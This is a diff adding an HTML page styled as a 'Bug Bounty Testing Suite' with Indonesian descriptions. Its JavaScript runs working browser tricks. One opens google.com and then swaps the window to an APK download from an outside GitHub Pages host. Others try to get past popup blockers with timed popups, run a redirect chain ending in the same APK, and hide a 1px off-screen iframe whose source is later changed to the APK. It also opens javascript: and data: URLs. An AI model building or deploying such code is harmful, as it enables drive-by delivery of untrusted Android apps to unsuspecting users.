@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Bug Bounty Testing Suite</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background: #f0f0f0;
+    }
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #333;
+      border-bottom: 3px solid #4CAF50;
+      padding-bottom: 10px;
+    }
+    .test-section {
+      margin: 20px 0;
+      padding: 15px;
+      background: #f9f9f9;
+      border-left: 4px solid #4CAF50;
+    }
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 12px 24px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 14px;
+      margin: 8px 4px;
+      cursor: pointer;
+      border-radius: 4px;
+      transition: 0.3s;
+    }
+    .button:hover {
+      background-color: #45a049;
+    }
+    .button.danger {
+      background-color: #f44336;
+    }
+    .button.danger:hover {
+      background-color: #da190b;
+    }
+    .button.info {
+      background-color: #2196F3;
+    }
+    .button.info:hover {
+      background-color: #0b7dda;
+    }
+    .log {
+      background: #000;
+      color: #0f0;
+      padding: 15px;
+      border-radius: 5px;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      max-height: 300px;
+      overflow-y: auto;
+      margin-top: 15px;
+    }
+    .log-entry {
+      margin: 5px 0;
+    }
+    .warning {
+      color: #ff9800;
+      font-weight: bold;
+      padding: 10px;
+      background: #fff3cd;
+      border-radius: 5px;
+      margin: 10px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔒 Bug Bounty Testing Suite</h1>
+    
+    <div class="warning">
+      ⚠️ Testing Environment - For Security Research Only
+    </div>
+
+    <div class="test-section">
+      <h3>Test 1: Window Name Reuse Attack</h3>
+      <p>Tes apakah browser mengizinkan window dengan nama sama di-reuse untuk domain berbeda</p>
+      <button class="button" onclick="test1()">Run Test 1</button>
+    </div>
+
+    <div class="test-section">
+      <h3>Test 2: Delayed Download (Original)</h3>
+      <p>Membuka Google, delay 5 detik, lalu trigger download APK</p>
+      <button class="button" onclick="test2()">Run Test 2</button>
+    </div>
+
+    <div class="test-section">
+      <h3>Test 3: Popup Blocker Bypass</h3>
+      <p>Tes apakah setTimeout bisa bypass popup blocker</p>
+      <button class="button info" onclick="test3()">Run Test 3</button>
+    </div>
+
+    <div class="test-section">
+      <h3>Test 4: Multiple Window Redirect Chain</h3>
+      <p>Tes redirect chain dengan multiple windows</p>
+      <button class="button info" onclick="test4()">Run Test 4</button>
+    </div>
+
+    <div class="test-section">
+      <h3>Test 5: Protocol Handler Test</h3>
+      <p>Tes behavior dengan berbagai protokol</p>
+      <button class="button info" onclick="test5()">Run Test 5</button>
+    </div>
+
+    <div class="test-section">
+      <h3>Test 6: Iframe Injection</h3>
+      <p>Tes apakah bisa inject iframe untuk bypass same-origin</p>
+      <button class="button danger" onclick="test6()">Run Test 6</button>
+    </div>
+
+    <div class="test-section">
+      <button class="button danger" onclick="clearLog()">Clear Log</button>
+    </div>
+
+    <div class="log" id="log">
+      <div class="log-entry">[READY] Testing suite initialized...</div>
+    </div>
+  </div>
+
+  <script>
+    function log(message) {
+      const logDiv = document.getElementById('log');
+      const timestamp = new Date().toLocaleTimeString();
+      const entry = document.createElement('div');
+      entry.className = 'log-entry';
+      entry.textContent = `[${timestamp}] ${message}`;
+      logDiv.appendChild(entry);
+      logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    function clearLog() {
+      document.getElementById('log').innerHTML = '<div class="log-entry">[CLEARED] Log cleared...</div>';
+    }
+
+    // Test 1: Window Name Reuse Attack
+    function test1() {
+      log('TEST 1: Starting window name reuse test...');
+      try {
+        const w = window.open('https://google.com', 'testWindow');
+        log('Opened google.com in window "testWindow"');
+        
+        setTimeout(() => {
+          log('Attempting to reuse window name for different domain...');
+          window.open('https://example.com', 'testWindow');
+          log('TEST 1: Completed - Check if window was reused');
+        }, 3000);
+      } catch(e) {
+        log('TEST 1: ERROR - ' + e.message);
+      }
+    }
+
+    // Test 2: Original Delayed Download
+    function test2() {
+      log('TEST 2: Starting delayed download test...');
+      try {
+        window.open('https://google.com', 'downloadTest');
+        log('Opened google.com');
+        
+        setTimeout(() => {
+          log('Triggering APK download after 5 seconds...');
+          window.open('https://frozzipies.github.io/test.apk', 'downloadTest');
+          log('TEST 2: Download triggered');
+        }, 5000);
+      } catch(e) {
+        log('TEST 2: ERROR - ' + e.message);
+      }
+    }
+
+    // Test 3: Popup Blocker Bypass
+    function test3() {
+      log('TEST 3: Testing popup blocker bypass...');
+      let popupCount = 0;
+      
+      const delays = [0, 1000, 2000, 5000, 10000];
+      
+      delays.forEach(delay => {
+        setTimeout(() => {
+          try {
+            const popup = window.open('https://example.com', '_blank');
+            if (popup) {
+              popupCount++;
+              log(`Popup ${popupCount} opened after ${delay}ms delay - SUCCESS`);
+            } else {
+              log(`Popup blocked after ${delay}ms delay - BLOCKED`);
+            }
+          } catch(e) {
+            log(`Popup after ${delay}ms - ERROR: ${e.message}`);
+          }
+        }, delay);
+      });
+      
+      log('TEST 3: Scheduled 5 popups with different delays');
+    }
+
+    // Test 4: Multiple Window Redirect Chain
+    function test4() {
+      log('TEST 4: Testing redirect chain...');
+      try {
+        const w1 = window.open('https://google.com', 'chain1');
+        log('Window 1 opened: google.com');
+        
+        setTimeout(() => {
+          w1.location = 'https://example.com';
+          log('Window 1 redirected to example.com');
+        }, 2000);
+        
+        setTimeout(() => {
+          w1.location = 'https://wikipedia.org';
+          log('Window 1 redirected to wikipedia.org');
+        }, 4000);
+        
+        setTimeout(() => {
+          log('TEST 4: Attempting final redirect...');
+          w1.location = 'https://frozzipies.github.io/test.apk';
+          log('TEST 4: Completed');
+        }, 6000);
+      } catch(e) {
+        log('TEST 4: ERROR - ' + e.message);
+      }
+    }
+
+    // Test 5: Protocol Handler Test
+    function test5() {
+      log('TEST 5: Testing various protocols...');
+      
+      const protocols = [
+        'https://google.com',
+        'http://example.com',
+        'ftp://ftp.example.com',
+        'javascript:alert("XSS")',
+        'data:text/html,<h1>Test</h1>'
+      ];
+      
+      protocols.forEach((url, index) => {
+        setTimeout(() => {
+          try {
+            log(`Testing protocol: ${url}`);
+            window.open(url, `protocol_test_${index}`);
+            log(`Protocol test ${index + 1} - SUCCESS`);
+          } catch(e) {
+            log(`Protocol test ${index + 1} - BLOCKED: ${e.message}`);
+          }
+        }, index * 1000);
+      });
+    }
+
+    // Test 6: Iframe Injection
+    function test6() {
+      log('TEST 6: Testing iframe injection...');
+      try {
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://example.com';
+        iframe.style.width = '1px';
+        iframe.style.height = '1px';
+        iframe.style.position = 'absolute';
+        iframe.style.left = '-9999px';
+        document.body.appendChild(iframe);
+        log('TEST 6: Iframe injected (hidden)');
+        
+        setTimeout(() => {
+          try {
+            iframe.src = 'https://frozzipies.github.io/test.apk';
+            log('TEST 6: Iframe source changed to APK file');
+          } catch(e) {
+            log('TEST 6: Source change ERROR - ' + e.message);
+          }
+        }, 3000);
+      } catch(e) {
+        log('TEST 6: ERROR - ' + e.message);
+      }
+    }
+
+    log('[READY] All tests loaded. Click buttons to run tests.');
+  </script>
+</body>
+</html>
